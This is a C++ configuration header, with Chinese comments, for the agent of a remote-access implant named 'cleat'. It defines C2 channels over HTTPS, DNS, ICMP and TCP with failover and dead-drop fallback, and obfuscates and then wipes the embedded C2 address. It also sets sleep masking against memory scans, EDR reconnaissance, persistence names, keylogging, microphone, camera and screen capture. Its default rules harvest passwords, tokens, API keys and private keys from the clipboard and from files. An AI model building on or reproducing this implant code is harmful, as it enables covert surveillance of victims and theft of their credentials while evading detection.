/**
 * @file AgentConfig.hpp
 * @brief 单一配置源（profile 化）
 * @details
 * 所有可调参数集中声明默认值，组件只从 Instance() 读取。
 *
 * 分层策略：编译期默认（本结构体） < SetConfig 远程下发（ApplyJson，运行时可覆盖）。
 * SetConfig = 运行时会话调参（sleep/jitter 命令的等价物）。
 *
 * 并发安全：SetConfig 在任务线程写，主循环/心跳/服务线程读 —— 内部使用
 * shared_mutex 保护，读取方一律通过 GetXxx() 获取拷贝，不直接碰字段。
 *
 * 编译期协议/缓冲常量（帧上限、加密 nonce 等）不属于本配置。
 */

#pragma once

#include <cstdint>
#include <cstdlib>
#include <functional>
#include <shared_mutex>
#include <string>
#include <unordered_map>
#include <vector>
#include "Common/Protocol/CmdDef.hpp"
#include "Common/ThirdParty/json.hpp"
#include "Core/Bootstrap/StaticObfConfig.hpp"   // 烧录混淆块解码(Phase B1, 见该头文件宏桥接)
#include "Core/Config/ChannelFieldRules.hpp"   // P2: Valid 判据单一数据源(零依赖)
#include "Core/Config/HeartbeatConfig.hpp"

namespace cleat {

    /**
     * @brief 断线重连/首连退避参数
     */
    struct ReconnectConfig {
        uint32_t first_connect_base_ms = 1000;   ///< 首连失败退避起点（毫秒）
        uint32_t first_connect_max_ms = 30000;   ///< 首连退避上限（毫秒）
        uint32_t base_ms = 5000;                 ///< 断线重连退避起点（毫秒）
        uint32_t max_ms = 60000;                 ///< 重连退避上限（毫秒）
        uint32_t jitter_permille = 300;          ///< ±30% 随机抖动（防惊群）
    };

    /**
     * @brief 降级链策略（Phase 2，远程可下发）
     * @details 多候选传输的失败切换/回探/防抖
     */
    struct TransportFailoverConfig {
        uint32_t fail_threshold = 3;         ///< 当前候选连续失败 N 次触发切下一个
        uint32_t min_hold_ms = 30000;        ///< 切换后最小保持（防 A/B 震荡）
        uint32_t probe_interval_ms = 30000;  ///< 降级运行时对更高优先候选的回探周期
    };

    /**
     * @brief 通道规格（SetConfig 的 channels 域, 运行期热切换整条降级链）
     * @details
     * type: https|tcp|dns|icmp(大小写不敏感)。
     * - https: url 可带 scheme(https://host[:port]/path) 或仅路径(配合 host/port 组装);
     *   upload_url 同规则, 空 = 与 url 同路径。
     * - tcp:   host/port 指定端点; 两者都空 = 沿用启动 -host/-port(与 legacy 一致)。
     * - dns:   dns_server(host:port) + dns_domain 必填。
     * - icmp:  icmp_target 必填。
     */
#ifndef CLEAT_DEFAULT_DD_PREFIX
#define CLEAT_DEFAULT_DD_PREFIX "https://"
#endif
//  正式交付的 DD 主密钥经烧录混淆块 id=9 注入(每构建随机,
// dd_key 烧录落地后(TeamServer 侧另行提交), 本字面量不再出现在交付产物里。
#ifndef CLEAT_DEFAULT_DD_KEY
#define CLEAT_DEFAULT_DD_KEY "cleat-dd-default-key-v1"
#endif

    struct ChannelSpec {
        std::string type;          ///< https|tcp|dns|icmp|wss(存储时已归一为小写)
        std::string host;          ///< https/tcp/wss: 主机(https/wss 可空, 配合 url 全路径)
        uint16_t    port = 0;      ///< 端口(0 = 由 url 或启动参数决定)
        std::string url;           ///< https/wss: 全 URL 或路径(如 /index.php; wss 须 wss://)
        std::string upload_url;    ///< https: POST 回传路径(空 = url)
        std::string dns_server;    ///< dns: 服务器 host:port
        std::string dns_domain;    ///< dns: 查询域
        std::string icmp_target;   ///< icmp: 目标 IP

        /// 基本合法性(类型可识别 + 该类型关键字段非空); 空类型视为非法
        bool Valid() const;
    };

    /**
     * @brief 各服务默认参数
     * @details 当各 Service Start(params) 未显式给值时使用
     */
    struct ServiceDefaults {
        uint32_t audio_report_interval_ms = 5000;  ///< 录音推送间隔（毫秒）
        uint32_t audio_sample_rate = 44100;        ///< 音频采样率
        uint32_t audio_channels = 1;               ///< 音频声道数
        uint32_t audio_bits_per_sample = 16;       ///< 音频位深
        uint32_t keylog_report_interval_ms = 5000; ///< 按键推送间隔（毫秒）
        uint32_t desktop_frame_interval_ms = 1000; ///< 桌面推帧间隔（毫秒）
        uint32_t camera_frame_interval_ms = 1000;  ///< 摄像头推帧间隔（毫秒）
        uint32_t download_chunk_size = 64 * 1024;  ///< 文件下载分块大小（字节）
    };

    /**
     * @brief 采集（截图/摄像头）默认参数
     */
    struct CaptureDefaults {
        uint32_t screenshot_quality = 85;   ///< JPEG 质量 0-100（与历史默认一致）
        uint32_t camera_quality = 85;       ///< 摄像头 JPEG 质量
        uint32_t screenshot_scale = 100;    ///< 缩放百分比（未接线）
    };

    /**
     * @brief 剪贴板监听规则
     * @details type 可选值：regex | keyword | always
     */
    struct ClipboardRule {
        std::string name;                     ///< 规则名称
        std::string type;                     ///< 规则类型：regex/keyword/always
        std::string pattern;                 ///< 正则表达式（type=regex 时使用）
        std::vector<std::string> keywords;   ///< 关键词列表（type=keyword 时使用）
    };

    /**
     * @brief 剪贴板监听配置（SetConfig 的 clipboard 域下发）
     */
    struct ClipboardConfig {
        uint32_t monitor_interval_ms = 2000; ///< 轮询间隔（毫秒）
        uint32_t max_report_len = 4096;      ///< 单次上报文本上限（截断）
        uint32_t min_len = 4;                ///< 长度下限（防噪声）
        std::vector<ClipboardRule> rules;    ///< 规则列表，空则不上报文本

        ClipboardConfig() {
            // 默认规则集（url/credential/private_key，SetConfig 传 rules 时整体覆盖）
            rules.push_back({ "url", "regex", R"(https?://[^\s"']+)", {} });
            // 注意：std::regex（ECMAScript）不支持 (?i) 内联标志，大小写不敏感由
            // std::regex::icase 提供（匹配时）；规则语法须为 ECMAScript
            rules.push_back({ "credential", "regex",
                R"((password|passwd|token|secret|api[_-]?key)[=:\s][^\s]+)", {} });
            rules.push_back({ "private_key", "keyword", "", {"-----BEGIN"} });
        }
    };

    /**
     * @brief 文件监控规则
     * @details type 可选值：extension | path_regex | always
     */
    struct FileMonitorRule {
        std::string name;                         ///< 规则名称
        std::string type;                         ///< 规则类型：extension/path_regex/always
        std::vector<std::string> extensions;      ///< 扩展名列表（type=extension 时使用，不带点）
        std::string pattern;                      ///< 路径正则表达式（type=path_regex 时使用，ECMAScript 语法，无 (?i)）
    };

    /**
     * @brief 生命周期治理配置
     * @details
     * killdate 用 UTC epoch 秒（时区无关）；工作窗口用本机时区当日分钟数
     * （start==end = 全天 = 未启用窗口）；窗外行为 pause（默认）| exit。
     * 生成期烧入走 CLEAT_DEFAULT_KILL_DATE（epoch 秒字符串）与
     * CLEAT_DEFAULT_WORK_HOURS（"HH:MM-HH:MM"），与 CLEAT_DEFAULT_* 家族同范式。
     */
    struct LifecycleConfig {
        uint64_t kill_date_utc = 0;      ///< killdate（UTC epoch 秒；0 = 永不过期）
        uint32_t work_start_minute = 0;  ///< 工作窗口起点（当日分钟数，本机时区）
        uint32_t work_end_minute = 0;    ///< 工作窗口终点（start > end 视为跨午夜窗口）
        bool outside_exit = false;       ///< 窗外行为：false=暂停(默认) true=退出

        LifecycleConfig() {
#ifdef CLEAT_DEFAULT_KILL_DATE
            kill_date_utc = std::strtoull(CLEAT_DEFAULT_KILL_DATE, nullptr, 10);
#endif
#ifdef CLEAT_DEFAULT_WORK_HOURS
            {
                int sh = 0, sm = 0, eh = 0, em = 0;
                if (std::sscanf(CLEAT_DEFAULT_WORK_HOURS, "%d:%d-%d:%d",
                                &sh, &sm, &eh, &em) == 4) {
                    work_start_minute = static_cast<uint32_t>(sh) * 60 + sm;
                    work_end_minute = static_cast<uint32_t>(eh) * 60 + em;
                }
            }
#endif
        }
    };


    /**
     * @brief 睡眠掩码配置（SetConfig 的 mask 域下发;  MaskWindow 设计）
     * @details 运行期开关默认关; 执行体还需构建期 CLEAT_WITH_MASK=ON(产物级兜底)。
     *          窗长上限建议 ≤120000ms(窗口越长越难被扫描撞上, 但操作延迟越大)。
     */
    struct MaskConfig {
        bool enabled = false;              ///< 睡眠掩码总开关(仅 Poll 通道 + 全静默时生效)
        uint32_t sleep_ms = 120000;        ///< 窗长**上限**(v1.5: 实际窗长=min(距下次check-in到期, 本值);
                                           ///< 默认取钳位上限 → 开箱窗长严格跟随心跳, 需压制再改小)
        uint32_t jitter_permille = 300;    ///< 窗长抖动(千分比; 仅固定窗路径生效, requestMs 路径不叠)
    };

    /**
     * @brief 文件监控配置（SetConfig 的 file_monitor 域下发）
     */
    struct FileMonitorConfig {
        std::string path;                         ///< 监控根目录（空表示 Start 必须显式传）
        bool recursive = true;                    ///< 是否递归监控子目录
        std::vector<std::string> watch;           ///< 监控事件类型：create/modify/delete/rename（空则全部）
        std::vector<FileMonitorRule> rules;       ///< 规则列表，空则全部上报

        FileMonitorConfig() {
            // 默认规则：office 文档 + 敏感命名文件
            rules.push_back({ "office_docs", "extension",
                {"docx", "xlsx", "pptx", "pdf"}, "" });
            rules.push_back({ "secret_files", "path_regex", {},
                R"((password|credential|key|secret)[^\\]*\.(txt|log|json)$)" });
        }
    };

    /**
     * @brief 单命令限流规则（channel_limit 的 commands 域条目 / default 兜底）
     * @details 0 表示对应维度不限制
     */
    struct ChannelLimitRule {
        uint32_t max_bytes = 4096;   ///< 单帧载荷上限（字节），0 = 不限制
        uint32_t rate_per_min = 10;  ///< 每分钟发送次数上限（滑动窗口），0 = 不限制
    };

    /**
     * @brief 低带宽通道报文级限流配置（SetConfig 的 channel_limit 域下发）
     * @details 只对低带宽通道（DNS/ICMP）生效；TCP/HTTPS 不受影响。
     *   deny     = 命令黑名单，命中直接拒绝发送（压根出不去）
     *   commands = 命令明细规则（按命令名精确匹配）
     *   default  = 未命中明细的命令的兜底规则
     */
    struct ChannelLimitConfig {
        bool enabled = true;                                 ///< 总开关（低带宽通道）
        std::vector<std::string> deny;                       ///< 黑名单命令
        std::unordered_map<std::string, ChannelLimitRule> commands; ///< 明细规则
        ChannelLimitRule default_rule;                       ///< 兜底规则

        ChannelLimitConfig() {
            // 编译期默认规则集：服务器未下发 channel_limit 时也提供基础保护，
            // 不裸奔。低带宽通道物理上限约 28KB（DatagramCodec 255×110B），
            // 配额取保守值；操作员可经 SetConfig 整体覆盖或 enabled=false 关闭。
            const auto set = [this](const char* name, uint32_t max_bytes, uint32_t rate_per_min) {
                commands[name] = ChannelLimitRule{ max_bytes, rate_per_min };
            };
            // 一次性命令响应（Commands 层）
            set(Cmd::ProcessManager::Enum(),          16 * 1024, 2);
            set(Cmd::ServiceManager::Enum(),           8 * 1024, 2);
            set(Cmd::DriverManager::Enum(),            8 * 1024, 2);
            set(Cmd::SoftwareManager::Enum(), 8 * 1024, 2);
            set(Cmd::WindowManager::Enum(),            8 * 1024, 2);
            set(Cmd::NetworkManager::Enum(),           8 * 1024, 2);
            set(Cmd::FileManager::ListDir(),           8 * 1024, 4);
            set(Cmd::FileManager::GetDrives(),         2 * 1024, 4);
            set(Cmd::RegistryManager::EnumKey(),       4 * 1024, 4);
            set(Cmd::RegistryManager::GetValue(),      4 * 1024, 4);
            set(Cmd::Clipboard::Get(),          4 * 1024, 2);
            set(Cmd::GetSystemInfo(),         4 * 1024, 4);
            set(Cmd::EdrRecon::Scan(),       16 * 1024, 2);
            set(Cmd::ScreenShot::SingleShot(), 20 * 1024, 1);
            set(Cmd::Camera::Capture(),        20 * 1024, 1);
            set(Cmd::Terminal::Start(),       8 * 1024, 6);
            set(Cmd::Runtime::SetConfig(),             8 * 1024, 4);
            set(Cmd::Runtime::GetConfig(),             8 * 1024, 4);
            // 主动推送（低带宽上多为小报文；流式服务已被 IsHighBandwidth 拦截）
            set(Cmd::Telemetry::EventReport(),           4 * 1024, 30);
            set(Cmd::Terminal::Output(),        8 * 1024, 30);
            set(Cmd::Keylog::Data(),            4 * 1024, 30);
            set(Cmd::Heartbeat::Ping(),           512, 60);
            set(Cmd::Heartbeat::Pong(),           512, 60);
        }
    };

    /**
     * @brief Agent 配置中心（单例）
     * @details
     * 管理所有配置参数，分为编译期固定参数（如 server_host）和运行时可远程下发的参数。
     * 读取方必须通过 GetXxx() 方法获取拷贝，确保线程安全。
     */
    class AgentConfig {
    public:
        /// 获取单例实例
        static AgentConfig& Instance();

        // ---- 连接参数（编译期层，不支持远程下发；启动期单线程读取，无需加锁） ----
        // AF1 订正: 本块已不全是"无锁只读" —— http_user_agent 可经 SetConfig
        // 运行期下发(http 域 user_agent 字段, ApplyJson 持写锁写), 读方必须走
        // GetHttpUserAgent(); https 两字段已移出本块(F2)。
        // 优先级：内置默认 < 编译期默认（Artifact 生成器烧参数；Phase B1 起地址类字段
        // 由 CLEAT_DEFAULT_OBF 混淆块解码后经宏桥接注入，宏名与顺序不变）< CLI

#ifdef CLEAT_DEFAULT_HOST
        std::string server_host = CLEAT_DEFAULT_HOST;   ///< 服务器主机地址
#else
        std::string server_host = "127.0.0.1";
#endif

#ifdef CLEAT_DEFAULT_PORT
        uint16_t server_port = static_cast<uint16_t>(std::atoi(CLEAT_DEFAULT_PORT)); ///< 服务器端口
#else
        uint16_t server_port = 4444;
#endif

        uint32_t recv_timeout_ms = 5000;   ///< 接收超时（毫秒）

        /// 传输模式（引导层，CLI --transport 可覆盖）：tcp | https | dns | icmp
#ifdef CLEAT_DEFAULT_TRANSPORT
        std::string transport_mode = CLEAT_DEFAULT_TRANSPORT;
#else
        std::string transport_mode = "tcp";
#endif

#ifdef CLEAT_DEFAULT_URL
        std::string https_url = CLEAT_DEFAULT_URL;      ///< HTTPS 基础 URL
#else
        std::string https_url = "";
#endif

#ifdef CLEAT_DEFAULT_UPLOAD_URL
        std::string https_upload_url = CLEAT_DEFAULT_UPLOAD_URL; ///< HTTPS 上传专用 URL
#else
        std::string https_upload_url = "";
#endif

        std::string wss_url = "";    ///< WebSocket 通道 URL(wss://host[:port]/path; D9: 默认空 =
                                     ///  不启用, 显式配置(--url wss:// 或 SetConfig channels)才生效

#ifdef CLEAT_DEFAULT_DNS_SERVER
        std::string dns_server = CLEAT_DEFAULT_DNS_SERVER; ///< DNS 服务器地址
#else
        std::string dns_server = "";
#endif

#ifdef CLEAT_DEFAULT_DNS_DOMAIN
        std::string dns_domain = CLEAT_DEFAULT_DNS_DOMAIN; ///< DNS 通信域名
#else
        std::string dns_domain = "";
#endif

#ifdef CLEAT_DEFAULT_ICMP_TARGET
        std::string icmp_target = CLEAT_DEFAULT_ICMP_TARGET; ///< ICMP 目标地址
#else
        std::string icmp_target = "";
#endif

#ifdef CLEAT_DEFAULT_UA
        std::string http_user_agent = CLEAT_DEFAULT_UA;   ///< HTTP User-Agent（空则启动时随机选常见浏览器 UA）
#else
        std::string http_user_agent = "";
#endif
        // AF1: https_ignore_cert / https_proxy 原先就定义在这个"无需加锁"的区块里,
        // 但 ApplyJson(CommandWorker 线程, 持写锁)会写它们, Http 传输在连接线程读 —— 与区块前提
        // 直接冲突(F2: std::string 一处赋值、另一处拷贝构造 = 真实数据竞争/UB)。已移入下方私有
        // 可调字段区, 读写一律经 GetHttpsIgnoreCert/GetHttpsProxy 与 SetHttpsIgnoreCert/SetHttpsProxy。

        // ---- 可远程下发参数：读取方必须用 GetXxx() 拷贝，勿直接读字段 ----

        /**
         * @brief 从远程 JSON 参数更新可调字段（自动 clamp）
         * @param params JSON 对象，包含要下发的配置键值
         * @return 实际生效值的 JSON 摘要
         */
        nlohmann::json ApplyJson(const nlohmann::json& params);

        /**
         * @brief 配置应用观察者(B3-7 收口): ApplyJson 应用成功后**锁外**回调一次
         * @param obs 入参 = applied 摘要(本次真正生效的键)。观察者据 contains(域)
         *            决定联动(如 reconnect 域 → SessionRunner 重配退避)。
         * @note 装配根(SetupCallbacks)接线**一次**, 不做并发保护 —— 接线先于
         *       命令 worker 启动, 此后只读。回调内**不得**再调 ApplyJson(重入)。
         */
        void SetAppliedObserver(std::function<void(const nlohmann::json& applied)> obs) {
            config_applied_obs_ = std::move(obs);
        }

        /**
         * @brief 回读当前生效配置全量(读锁内组装, 供 GetConfig 回显)
         * @return JSON: 可下发区(顶层仅子域,  散键归位: runtime/http/persist
         *         +既有各域) 外加 _startup 只读区(编译/启动期固定参数, SetConfig 不可改)。
         *         键名与 ApplyJson 输入契约一致, 前端可直接用于表单回填与 diff。
         */
        nlohmann::json DumpJson() const;

        /// 获取启动随机延时上限（防惊群），0 表示不延时
        uint32_t GetFirstConnectDelayMaxMs() const;

        /// 获取命令执行超时（毫秒）
        uint32_t GetWorkerTimeoutMs() const;

        /**
         * @brief 获取日志级别
         * @return 0=DEBUG 1=INFO 2=WARN 3=ERROR 4=OFF（远程可下发: SetConfig runtime.log_level）
         */
        int GetLogLevel() const;

        /// 获取 HTTPS User-Agent（空则使用随机池，见 PlatformWin_Http）
        std::string GetHttpUserAgent() const;

        /// 获取 HTTPS 证书校验跳过开关(可远程下发: SetConfig http.ignore_cert; 加读锁)
        bool GetHttpsIgnoreCert() const;

        /// 获取 HTTPS 代理(空=直连 | "system"=系统代理 | "host:port"=显式代理; 加读锁)
        std::string GetHttpsProxy() const;

        /**
         * @brief 设置 HTTPS 证书校验跳过开关(CLI --https-ignore-cert / 测试脚手架)
         * @note 加写锁。**不得**在已持锁路径调用(shared_mutex 非递归) —— 运行期下发走
         *       ApplyJson, 它在锁内直接写字段。字段私有后, 无锁读法在编译期即不可能(F2)。
         */
        void SetHttpsIgnoreCert(bool v);

        /// 设置 HTTPS 代理(CLI --https-proxy / 测试脚手架); 其余同 SetHttpsIgnoreCert
        void SetHttpsProxy(const std::string& v);

        /// 获取 QUIC 通道证书校验跳过开关(可远程下发: SetConfig quic.ignore_cert; 加读锁)
        bool GetQuicIgnoreCert() const;

        /// 设置 QUIC 通道证书校验跳过开关(CLI --quic-ignore-cert); 其余同 SetHttpsIgnoreCert
        void SetQuicIgnoreCert(bool v);

        /// 获取睡眠掩码配置(可远程下发: SetConfig mask 域; 加读锁)。
        /// 执行体需构建期 CLEAT_WITH_MASK=ON —— 配置面无条件存在, 读到 enabled=true
        /// 而产物未编入掩码时, 判定层(MaskGate)直接按"不可用"拒绝, 配置无害。
        MaskConfig GetMaskConfig() const;

        /// 设置睡眠掩码配置(CLI --mask-* 启动期注入); 加写锁, 运行期下发走 ApplyJson。
        void SetMaskConfig(const MaskConfig& v);

        /// 获取 TCP 伪装壳开关(可远程下发: SetConfig http.mimic; 加读锁)。
        /// 语义升级注: 原为编译期宏 CLEAT_HTTP_MIMIC —— 伪装是运行时
        /// 行为选择而非构建形态, 改配置热开关(TcpWireCodec/TcpTransport 读)。
        bool GetTcpMimic() const;

        /// 获取持久化注册表值名称（空则随机生成，见 PlatformWin_Persistence）
        std::string GetPersistValueName() const;
        std::string GetPersistTaskName() const;
        std::string GetPersistAuthor() const;

        // : crash_dump_enabled 已移除 —— 崩溃日志改由构建期
        // 决定(Debug 恒开/Release 恒关, 见 Core/CrashGuard/CrashGuard.hpp), 运行期键
        // 原本就无生效路径(仅 CrashGuard 安装时读一次, 且安装先于嵌入式配置应用)。

        /// 获取心跳配置
        HeartbeatConfig GetHeartbeat() const;

        /// 获取重连退避配置
        ReconnectConfig GetReconnect() const;

        /// 获取传输降级链策略（远程可下发）
        TransportFailoverConfig GetTransportFailover() const;

        /// 获取运行期通道链(空 = 未下发, 使用启动装配的 legacy 链)
        /// Phase C: 驻留态为 Vault 密文, 本函数现场解封返回拷贝(语义不变)
        std::vector<ChannelSpec> GetChannels() const;

        /// 获取通道链修订号(每次成功下发 +1, 主循环据此触发热切换)
        uint64_t GetChannelsRevision() const;

        /// 通道能力快照(装配层在每次成功装配/换链后写入, Handler 只读)。
        /// 数组项: {"type","state","rank"[,"bandwidth"|"reason"]} —— state 三态:
        ///   active(本轮已入链, 顺序=候选优先级) / not_configured(平台支持, 未配置)
        ///   / unavailable(平台不支持或构建期裁剪, reason 说明)。
        /// 纯数据零网络依赖: 服务端能力感知的数据源(AgentDescribe/GetConfig 转发),
        /// 填"盲发 quic:// 配置给裁剪形态"的控制面暗坑 —— 服务端可区分
        /// "支持但没配"与"根本不支持"。空数组 = 装配未完成。
        void SetChannelCapabilities(const nlohmann::json& caps);
        nlohmann::json GetChannelCapabilities() const;

        ///  死投递恢复配置(SetConfig "recovery" 域动态覆盖; 编译期默认保证首启可用)
        struct RecoveryConfig {
            /// 单个死投递平台(有序 = 优先级序; 加平台 = 注册表登记 + 此处一条)
            struct PlatformSpec {
                std::string type;  ///< 平台类型(DeadDropPlatforms 查表键: "gist"/...)
                std::string url;   ///< 平台内容地址(如 gist api / 频道 raw 地址)
            };
        std::string prefix = CLEAT_DEFAULT_DD_PREFIX;  ///< 备胎地址前缀
        //  旧兼容别名 api_url 已从本结构移除 —— 输入兼容保留在
        // ApplyRecovery 解析器里(下发含 api_url 且不含 platforms 时归一成单
        // gist 平台), 结构体只保留归一后的真相(platforms), 不再有第二份状态。
        //  key 由 AgentConfig 构造期从烧录混淆块(id=9)注入,
        std::string key;                               ///< 主密钥(空 = 用编译期缺省 CLEAT_DEFAULT_DD_KEY)
            std::string upload_path = "/api/data";         ///< 恢复后 POST 上传路径(GET 路径取 suffix 或原配置)
            uint32_t recover_after_fails = 20;             ///< 连续失败 N 次触发**首次**恢复(钳位 2..200)
            /// 失败后重试节奏(先快后慢,  天级化): 等待 = min × 2^轮次, 封顶 max。
            /// 稳态节奏由 max 决定。
            uint32_t retry_min_minutes = 30;               ///< 失败后首次重试等待(分钟; 0 = 跟随重连退避, 钳位 0..10080)
            uint32_t retry_max_minutes = 1440;             ///< 重试等待封顶(分钟; 1440 = 24h, 钳位 0..10080)
            std::vector<PlatformSpec> platforms;           ///< 平台清单(空 = 死投递未启用)

            /// 第 round 轮失败后的等待分钟数(纯函数, 可单测): min × 2^round 封顶
            /// 有效 max(= max(min, retry_max); min > max 时恒为 min)。round 无界安全。
            uint32_t RetryWaitMinutes(uint32_t round) const {
                const uint64_t lo = retry_min_minutes;
                const uint64_t hi = retry_max_minutes > lo ? retry_max_minutes : lo;
                uint64_t v = lo;
                for (uint32_t i = 0; i < round && v < hi; ++i) {
                    v *= 2;
                    if (v > hi) { v = hi; break; }
                }
                return static_cast<uint32_t>(v);
            }
        };
        RecoveryConfig GetRecovery() const;

        /**
         * @brief 死投递恢复换址: 把第一个 https 通道的 url/upload_url 替换为 newUrl
         * @return true = 已应用(通道链重新密封 + 修订号推进, 主循环自动热切换);
         *         false = 无 https 通道可换(纯 TCP 部署无死投递意义)
         * @details 只动链中**第一条** https 的 url/upload_url, 其余 https(备用链路)与
         *          非 https 通道一律保持原状( 塌缩修复: 原实现遍历改写全部
         *          https, 与本注释不符); 不走 SetConfig 的整体 channels 域 —— 恢复换址
         *          只动 url 一个字段, 其余通道参数保持原状; 密封失败 fail-closed 同既有语义。
         */
        bool ApplyRecoveredUrl(const std::string& newUrl);

        /// 获取各服务默认参数
        ServiceDefaults GetServiceDefaults() const;

        /// 获取采集默认参数
        CaptureDefaults GetCapture() const;

        /// 获取剪贴板监听配置
        ClipboardConfig GetClipboard() const;

        /// 获取文件监控配置
        FileMonitorConfig GetFileMonitor() const;

        /// 获取生命周期治理配置(killdate / working hours)
        LifecycleConfig GetLifecycle() const;

        /// 获取低带宽通道限流配置
        ChannelLimitConfig GetChannelLimit() const;

    private:
        AgentConfig();   // Phase C: 构造尾部擦除烧录混淆块解码缓存(见 AgentConfig.cpp)
        mutable std::shared_mutex mutex_;   ///< 读写锁，保护可调字段

        // 可调字段（默认值 = 历史硬编码值）
        uint32_t first_connect_delay_max_ms_ = 10000; ///< 首连随机延时上限（毫秒）
        uint32_t worker_timeout_ms_ = 120000;         ///< 命令执行超时（毫秒）
        int log_level_ = 1;                           ///< 日志级别，默认 INFO；启动期 AgentEntry 可覆盖为 DEBUG（开发）
        std::string persist_value_name_ = "";         ///< 持久化注册表值名（空则随机）
        std::string persist_task_name_ = "";          ///< 持久化任务名
        std::string persist_author_ = "";             ///< 持久化作者
        // F2/AF1: 原在"编译期无锁块"内且为公开字段 —— 实际可远程下发, 故收进来当可调字段管理。
        // 保留原字段名(以免改动 AgentConfigJson.cpp 的读写点); 后缀与邻居不一致, 待一并改名。
        bool https_ignore_cert = false;               ///< 跳过 TLS 证书校验（自签场景；默认严格校验）
        std::string https_proxy = "";                 ///< 空=直连（默认，OPSEC 不读系统代理）| "system"=系统代理 | "host:port"=显式代理
        bool tcp_mimic = true;                        ///< TCP 通道 HTTP 伪装壳（TrafficShaper；默认开，对齐原编译期宏 CLEAT_HTTP_MIMIC；可远程下发 http.mimic）
        bool quic_ignore_cert = false;                ///< QUIC 通道跳过对端证书校验（自签场景；默认严格，对齐 https_ignore_cert）

        MaskConfig mask_;                             ///< 睡眠掩码配置(SetConfig mask 域; 默认全关)

        HeartbeatConfig heartbeat_;                   ///< 心跳配置
        // Phase C: 通道链以 Vault 密文驻留(反序列化走 GetChannels/SealChannelsLocked)
        std::vector<uint8_t> channels_sealed_;        ///< 运行期通道链密文(SetConfig channels 域)
        uint64_t channels_revision_ = 0;              ///< 通道链修订号
        nlohmann::json channel_caps_ = nlohmann::json::array(); ///< 通道能力快照(装配层写, Handler 读)
        RecoveryConfig recovery_;                     ///<  死投递恢复域
        ReconnectConfig reconnect_;                   ///< 重连退避配置
        TransportFailoverConfig transport_failover_;  ///< 降级链策略
        ServiceDefaults service_defaults_;            ///< 服务默认参数
        CaptureDefaults capture_;                     ///< 采集默认参数
        ClipboardConfig clipboard_;                   ///< 剪贴板监听配置
        FileMonitorConfig file_monitor_;              ///< 文件监控配置
        LifecycleConfig lifecycle_;                   ///< 生命周期治理(killdate/working hours)
        ChannelLimitConfig channel_limit_;            ///< 低带宽通道限流(SetConfig channel_limit 域)

        /// 配置应用观察者(B3-7; SetAppliedObserver 接线, ApplyJson 锁外回调)
        std::function<void(const nlohmann::json&)> config_applied_obs_;

        // ---- Phase C: 通道链密文驻留(调用方须已持相应锁) ----
        /// 密封并驻留通道链; 失败 fail-closed: 丢弃本次更新(保持旧链/空链)
        /// 密封通道链; 返回 false = 密封失败(fail-closed: 调用方不得 bump revision)
        bool SealChannelsLocked(std::vector<ChannelSpec>& chans);
        /// 解封通道链; 失败返回空(语义 = 未下发, 使用启动装配 legacy 链)
        std::vector<ChannelSpec> OpenChannelsLocked() const;
    };

    // ---------------------------------------------------------------------------
    // 轻量内联定义: 单例入口 + 构造 + 纯读值 getter
    // ---------------------------------------------------------------------------
    // 模块 DLL(B 档 shim)也要读配置默认值, 但不能编入 AgentConfig.cpp ——
    // 那个文件牵出 SecretVault + libsodium(通道链封解密)。把"无副作用、无密码学"
    // 的一部分作为 inline 放头里, 主二进制与模块共用同一份定义:
    //   - 单源, 不存在第二份实现漂移
    //   - 模块侧只依赖 StaticObfConfig.cpp(纯 std), 零密码学依赖
    // 其余成员函数(ApplyJson / DumpJson / SealChannelsLocked / ...)仍在 .cpp。
    inline AgentConfig::AgentConfig() {
        //  死投递主密钥优先取烧录混淆块(id=9, 生成器每构建
        // 随机生成 ≥32B), 使 DD 签名防线不再被全产物共享的明文常量击穿; 未烧录
        // 解码缓存在本构造尾部整体擦除(含 dd_key), 明文密钥只经 recovery_.key 驻留。
        recovery_.key = GetStaticObfConfig().dd_key;
        // Phase C: 连接参数成员已从烧录混淆块解码注入(唯一消费点 = 本类成员初始化),
        // 解码缓存即完成使命 —— 擦除, 消除一处 C2 地址明文驻留副本
        WipeDecodedStaticObfConfig();
    }

    inline AgentConfig& AgentConfig::Instance() {
        static AgentConfig instance;
        return instance;
    }

    inline ServiceDefaults AgentConfig::GetServiceDefaults() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return service_defaults_;
    }

    inline CaptureDefaults AgentConfig::GetCapture() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return capture_;
    }

    inline ClipboardConfig AgentConfig::GetClipboard() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return clipboard_;
    }

    inline FileMonitorConfig AgentConfig::GetFileMonitor() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return file_monitor_;
    }

    inline LifecycleConfig AgentConfig::GetLifecycle() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return lifecycle_;
    }

    inline ChannelLimitConfig AgentConfig::GetChannelLimit() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        return channel_limit_;
    }

} // namespace cleat